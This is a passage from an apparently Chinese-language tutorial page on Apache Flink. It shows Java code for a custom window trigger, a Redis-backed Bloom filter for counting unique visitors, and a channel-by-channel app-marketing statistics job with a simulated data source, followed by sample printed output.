class="keyword">class</span> <span class="title">MyTrigger</span> <span class="keyword">extends</span> <span class="title">Trigger</span>&lt;<span class="title">UserBehavior</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onElement</span><span class="params">(UserBehavior element, <span class="keyword">long</span> timestamp, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 每一条数据来到，直接触发窗口计算，并且直接清空窗口</span></span><br><span class="line">      <span class="keyword">return</span> TriggerResult.FIRE_AND_PURGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onProcessingTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onEventTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义一个布隆过滤器</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBloomFilter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义位图的大小，一般需要定义为2的整次幂</span></span><br><span class="line">    <span class="keyword">private</span> Integer cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyBloomFilter</span><span class="params">(Integer cap)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.cap = cap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现一个hash函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">hashCode</span><span class="params">(String value, Integer seed)</span> </span>&#123;</span><br><span class="line">      Long result = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length(); i++) &#123;</span><br><span class="line">        result = result * seed + value.charAt(i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result &amp; (cap - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UvCountResultWithBloomFliter</span> <span class="keyword">extends</span> <span class="title">ProcessAllWindowFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">PageViewCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义jedis连接和布隆过滤器</span></span><br><span class="line">    Jedis jedis;</span><br><span class="line">    MyBloomFilter myBloomFilter;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;localhost&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">      myBloomFilter = <span class="keyword">new</span> MyBloomFilter(<span class="number">1</span> &lt;&lt; <span class="number">29</span>);    <span class="comment">// 要处理1亿个数据，用64MB大小的位图</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Context context, Iterable&lt;UserBehavior&gt; elements, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 将位图和窗口count值全部存入redis，用windowEnd作为key</span></span><br><span class="line">      Long windowEnd = context.window().getEnd();</span><br><span class="line">      String bitmapKey = windowEnd.toString();</span><br><span class="line">      <span class="comment">// 把count值存成一张hash表</span></span><br><span class="line">      String countHashName = <span class="string">&quot;uv_count&quot;</span>;</span><br><span class="line">      String countKey = windowEnd.toString();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 1. 取当前的userId</span></span><br><span class="line">      Long userId = elements.iterator().next().getUerId();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 2. 计算位图中的offset</span></span><br><span class="line">      Long offset = myBloomFilter.hashCode(userId.toString(), <span class="number">61</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 3. 用redis的getbit命令，判断对应位置的值</span></span><br><span class="line">      Boolean isExist = jedis.getbit(bitmapKey, offset);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!isExist) &#123;</span><br><span class="line">        <span class="comment">// 如果不存在，对应位图位置置1</span></span><br><span class="line">        jedis.setbit(bitmapKey, offset, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新redis中保存的count值</span></span><br><span class="line">        Long uvCount = <span class="number">0L</span>;    <span class="comment">// 初始count值</span></span><br><span class="line">        String uvCountString = jedis.hget(countHashName, countKey);</span><br><span class="line">        <span class="keyword">if</span> (uvCountString != <span class="keyword">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(uvCountString)) &#123;</span><br><span class="line">          uvCount = Long.valueOf(uvCountString);</span><br><span class="line">        &#125;</span><br><span class="line">        jedis.hset(countHashName, countKey, String.valueOf(uvCount + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;uv&quot;</span>, windowEnd, uvCount + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      jedis.close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7469&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7470&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7471&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7472&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7473&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=7474&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h5 id="市场营销分析——APP市场推广统计"><a href="#市场营销分析——APP市场推广统计" class="headerlink" title="市场营销分析——APP市场推广统计"></a>市场营销分析——APP市场推广统计</h5><ul><li>基本需求 <ul><li>从埋点日志中，统计APP市场推广的数据指标</li><li>按照不同的推广渠道，分别统计数据</li></ul></li><li>解决思路 <ul><li>通过过滤日志中的用户行为，按照不同的渠道进行统计</li><li>可以用process function处理，得到自定义的输出数据信息</li></ul></li></ul><h6 id="POJO-2"><a href="#POJO-2" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> MarketingUserBehavior  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> String channel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> ChannelPromotionCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String channel;</span><br><span class="line"><span class="keyword">private</span> String behavior;</span><br><span class="line"><span class="keyword">private</span> String windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-自定义测试数据源"><a href="#代码1-自定义测试数据源" class="headerlink" title="代码1-自定义测试数据源"></a>代码1-自定义测试数据源</h6><ul><li> java代码  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 5:32 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingByChannel</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从自定义数据源中读取数据</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> SimulatedMarketingUserBehaviorSource());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的模拟市场用户行为数据源</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 控制是否正常运行的标识位</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义用户行为和渠道的范围</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// 随机生成所有字段</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发出数据</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-具体实现"><a href="#代码2-具体实现" class="headerlink" title="代码2-具体实现"></a>代码2-具体实现</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ChannelPromotionCount;</span><br><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.ProcessWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 5:32 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingByChannel</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从自定义数据源中读取数据</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> SimulatedMarketingUserBehaviorSource())</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;MarketingUserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(MarketingUserBehavior element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 分渠道开窗统计</span></span><br><span class="line">    DataStream&lt;ChannelPromotionCount&gt; resultStream = dataStream</span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;UNINSTALL&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .keyBy(<span class="keyword">new</span> KeySelector&lt;MarketingUserBehavior, Tuple2&lt;String, String&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, String&gt; <span class="title">getKey</span><span class="params">(MarketingUserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getChannel(), value.getBehavior());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 定义滑窗</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MarketingCountAgg(), <span class="keyword">new</span> MarketingCountResult());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;app marketing by channel job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的模拟市场用户行为数据源</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 控制是否正常运行的标识位</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义用户行为和渠道的范围</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// 随机生成所有字段</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发出数据</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的增量聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">MarketingUserBehavior</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(MarketingUserBehavior value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的全窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingCountResult</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ChannelPromotionCount</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">String</span>&gt;, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Tuple2&lt;String, String&gt; stringStringTuple2, Context context, Iterable&lt;Long&gt; elements, Collector&lt;ChannelPromotionCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String channel = stringStringTuple2.f0;</span><br><span class="line">      String behavior = stringStringTuple2.f1;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(context.window().getEnd()).toString();</span><br><span class="line">      Long count = elements.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ChannelPromotionCount(channel, behavior, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=4&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;wechat&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, 